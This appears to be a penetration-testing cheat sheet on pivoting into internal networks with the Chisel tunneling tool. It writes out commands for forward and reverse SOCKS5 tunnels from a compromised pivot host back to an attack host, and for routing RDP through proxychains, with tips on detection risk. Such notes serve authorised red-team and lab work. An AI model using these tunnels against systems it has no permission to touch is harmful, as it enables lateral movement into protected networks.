
1. Determine if the compromised host allows inbound connections on arbitrary ports.
2. If inbound is allowed: Deploy a Chisel server on the pivot host and connect from the attack host.
3. If inbound is blocked (firewall restriction): Start a Chisel server with the reverse flag on the attack host and have the pivot host connect back.
4. Update `/etc/proxychains.conf` to match the local listening port (default 1080).
5. Execute internal tools through `proxychains`.

---

## Forward SOCKS5 Tunneling

Internal network segments are unreachable from the attack host and the pivot host allows inbound traffic on the chosen listener port.

Clone the repository to the attack host

```
git clone https://github.com/jpillora/chisel.git
```

Build the binary using the local Go environment

```
go build
```

Transfer the binary to the pivot host via SCP

```
scp chisel <USERNAME>@<PIVOT_IP>:~/
```

Start the server on the pivot host listening for SOCKS5 connections

```
./chisel server -v -p <PORT> --socks5
```

Connect the attack host client to the pivot server

```
./chisel client -v <PIVOT_IP>:<PORT> socks
```

Add the tunnel to the proxy list in /etc/proxychains.conf

```
socks5 127.0.0.1 1080
```

Run tools through the established SOCKS5 tunnel

```
proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

- **glibc version discrepancy** will trigger execution errors; compare library versions between systems or use prebuilt binaries.
- **Large binary size** increases the risk of detection and impacts performance during transfer.

## Reverse SOCKS5 Tunneling

Firewall rules restrict inbound connections to the compromised target host, requiring the pivot host to initiate the outbound connection.

Start the server on the attack host with reverse capabilities enabled

```
sudo ./chisel server --reverse -v -p <PORT> --socks5
```

Connect from the pivot host back to the attack host using a reverse remote

```
./chisel client -v <ATTACK_IP>:<PORT> R:socks
```

- **Reverse remote prefix** must be set to `R:socks` to ensure the server listens on its default SOCKS port (1080) and terminates at the client.

> ⚠️ Gap: Chisel requires the specific Go build environment; if the target lacks specific dependencies or has an incompatible glibc version, the binary will fail to execute. Always have prebuilt versions for various architectures ready.